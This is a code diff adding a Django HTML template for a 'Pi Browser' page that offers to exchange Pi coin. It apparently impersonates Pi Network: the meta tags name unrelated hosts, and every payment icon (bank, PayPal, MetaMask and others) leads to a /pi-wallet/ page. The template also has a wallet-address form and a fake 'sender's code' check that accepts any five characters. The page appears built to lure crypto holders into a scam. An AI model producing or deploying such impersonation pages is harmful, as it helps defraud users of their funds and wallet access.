@@ -1,0 +1,318 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pi Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." /> 
+    <link rel="canonical" href="https://Net-access{{request.path_info}}" />               
+    <meta property="og:site_name" content="Net-access" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Pi Exchange, Blockchain, Community & Developer Platform | Pi Network" />
+<meta property="og:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee." />
+<meta property="og:image" content="https://Net-access{% static '' %}" />
+<meta property="og:locale" content="en_us" />
+<meta property="og:url" content="https://PiConverter.info{{request.path_info}}" />
+<meta name="twitter:site" content="@PiConverter" />
+<meta name="twitter:title" content="" />
+<meta name="twitter:description" content="Pi exchanger, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." />
+<meta name="twitter:creator" content="@PiNetwork" />
+<meta name="twitter:image" content="https://afribang.com{% static '' %}" />
+<meta property="twiter:card" content="summary_large_image" />
+<meta name="twitter:image:alt" content="PiConverter Logo" />
+      <link rel="stylesheet" href="{% static 'piconverterapp/styles/docs.css' %}">
+      <link rel="apple-touch-icon" sizes="180x180" href="{% static 'piconverterapp/favicon.io/apple-touch-icon.png' %}">
+      <link rel="icon" type="image/png" sizes="32x32" href="{% static 'piconverterapp/favicon.io/favicon-32x32.png' %}">
+      <link rel="icon" type="image/png" sizes="16x16" href="{% static 'piconverterapp/favicon.io/favicon-16x16.png' %}">
+      <link rel="manifest" href="{% static 'piconverterapp/favicon.io/site.webmanifest' %}"> 
+    <title> Pi Browser </title>
+    <!-- end metadata -->
+</head>
+
+<style>
+  .wallet_pop{
+    width: 100%;
+    height: 100vh;
+    position: fixed;
+    top:0px;
+    left: 0px;
+    right: 0px;
+    bottom: 0px;
+    overflow: hidden;
+    box-sizing: border-box;
+    background-color: #00000080;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    display: none;
+  }
+  .fild{
+    width: 400px;
+    height: 350px;
+    background-color: #fff;
+    overflow: hidden;
+    box-sizing: border-box;
+    padding: 10px;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    border-radius: 5px;
+
+  }
+  .fild h2{
+    font-size: 1.2rem;
+  }
+  .fild input{
+    padding: 10px;
+    margin-bottom: 10px;
+    overflow: hidden;
+    margin-top: 5px;
+    width: 100%;
+    width: calc(100% - 20px);
+  }
+  .fild select{
+    padding: 10px;
+    margin-bottom: 10px;
+    margin-top: 5px;
+    overflow: hidden;
+    width: 100%;
+  }
+  .fild label{
+    font-size: 13px;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    font-weight: 500;
+  }
+  .fild button{
+    padding: 10px;
+    overflow: hidden;
+    cursor: pointer;
+    background-color: #315dd4;
+    border: none;
+    border-radius: 5px;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    color: #fff;
+    font-weight: 500;
+  }
+</style>
+<aside class="wallet_pop" id="fillpay">
+
+  <form class="fild" action="/pi-wallet/">
+<h2>
+  Complete Payment Details
+</h2>
+
+<label for="">Select wallet provider</label> <br>
+<select name="" id="" required>
+  <option value="">Select wallet provider</option>
+  <option value="">Binance</option>
+  <option value="">Coinbase</option>
+  <option value="">Bybit</option>
+  <option value="">Trust wallet</option>
+  <option value="">Kucoin</option>
+</select>
+<br>
+<label for="">Select Cryptocurrency</label> <br>
+<select name="" id="" required>
+  <option value="">Select Cryptocurrency</option>
+  <option value="">Bitcoin</option>
+  <option value="">Ethereum</option>
+  <option value="">USDT TRC20</option>
+  <option value="">BNB</option>
+</select>
+<br>
+<label for="">Enter Wallet Address</label> <br>
+<input type="text" name="" id="" placeholder="Enter wallet address" required>
+<br>
+<button style="background-color: black;" onclick="document.getElementById('fillpay').style.display = 'none';">
+  Back
+</button>
+<button>
+  Continue
+</button>
+  </form>
+
+</aside>
+
+<style>
+  si{
+    font-weight: 500;
+    color: rebeccapurple;
+  }
+</style>
+<body>
+  <nav class="hdd">
+    <aside class="as1">
+      &leftarrow;
+    </aside>
+    <aside class="as2">
+      <h3>Home</h3><img class="imgg" src="{% static 'piconverterapp/media/Pi-Network.png' %}" alt="">
+    </aside>
+    <aside class="down">
+      <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" font-weight="600" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
+        <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"/>
+      </svg>
+    </aside>
+  </nav>
+
+  <section class="set1">
+
+    <aside class="logo">
+      <img src="{% static 'piconverterapp/media/Pi-Network.png' %}" alt="">
+    </aside>
+    <aside class="logo-txt">
+      Welcome to pi browser
+    </aside>
+
+    <aside class="icon-set">
+
+      <div class="icon-holder">
+        <a  class="lik" href="/pi-wallet/" >
+          <div class="icon">
+            <img class="img3" src="{% static 'piconverterapp/media/nbank.png' %}" alt="">
+            <br>
+           <si>National Bank</si>
+          </div>
+         </a>
+
+        <a class="lik" href="/pi-wallet/">
+          <div class="icon">
+            <img class="img3" src="{% static 'piconverterapp/media/cashapp.png' %}" alt="">
+            <br>
+           <si>Cashapp</si>
+          </div>
+         </a>
+       
+       <a class="lik" href="/pi-wallet/" >
+        <div class="icon">
+          <img class="img3" src="{% static 'piconverterapp/media/mask.png' %}" alt="">
+          <br>
+         <si>Meta mask</si>
+        </div>
+       </a>
+       
+      </div>
+<br>
+      <div class="icon-holder">
+        <a  class="lik" href="/pi-wallet/">
+          <div class="icon">
+            <img class="img3" src="{% static 'piconverterapp/media/gpay.jpg' %}" alt="">
+            <br>
+           <si>Gpay</si>
+          </div>
+         </a>
+         <a class="lik" href="/pi-wallet/" >
+          <div class="icon">
+            <img class="img3" src="{% static 'piconverterapp/media/paypal.jpg' %}" alt="">
+            <br>
+           <si>Paypal</si>
+          </div>
+         </a>
+        <a class="lik" href="/pi-wallet/">
+         <div class="icon">
+           <img class="img3" src="{% static 'piconverterapp/media/trust.png' %}" alt="">
+           <br>
+          <si>Crypto</si>
+         </div>
+        </a>
+       </div>
+<br>
+       
+    </aside>
+
+    <br>
+    <br>
+<aside class="ijf">
+    <button class="exbtn">
+      <img src="{% static 'piconverterapp/media/compass.png' %}" alt=""> Explore the Testnet Ecosystem
+    </button>
+  </aside> 
+<br>
+<br>
+
+<style>
+    body{
+        overflow-x: hidden !important;
+    }
+    .sender_code{
+        width: 100%;
+        height: 100vh;
+        z-index: 200;
+        box-sizing: border-box;
+        background-color: #fff;
+        overflow: hidden;
+        top: 0px;
+        bottom: 0px;
+        right: 0px;
+        left: 0px;
+        position: fixed;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        display: none;
+    }
+    .sender_code aside{
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-sizing: border-box;
+        flex-direction: column;
+        text-align: center;
+        font-size: 13px;
+        font-weight: 500;
+    }
+    .sender_code aside > input{
+        padding: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+    }
+    .spec{
+        width: 100px;
+        padding: 10px;
+        background-color: rebeccapurple;
+        color: #fff;
+        cursor: pointer;
+        overflow: hidden;
+        border: none;
+        border-radius: 5px;
+    }
+</style>
+
+<aside class="sender_code" id="code">
+    <aside>
+        <h2>
+            Sender's Code.
+        </h2>
+        <p>
+            input sender code to verify payment.
+        </p>
+        <input type="text" name="" id="text" class="text">
+        <div id="msg" style="font-size: 13px; color:firebrick;">
+
+        </div>
+        <br>
+        <br>
+            <button class="spec" onclick="check()">
+                Continue
+            </button>
+            <script>
+                var tex = document.getElementById('text')
+                function check() {
+                    if (text.value.trim().length < 5 || text.value.trim().length > 5) {
+                        text.style.border = '2px solid firebrick'; document.getElementById('msg').innerHTML = 'Invalid code';
+                    }else{
+                        window.location.replace('/pi-wallet/')
+                    }
+                }
+            </script>
+    </aside>
+</aside>
+
+  </section>
+
+  <script>
+  </script>
+
+        
+</body>
+</html>
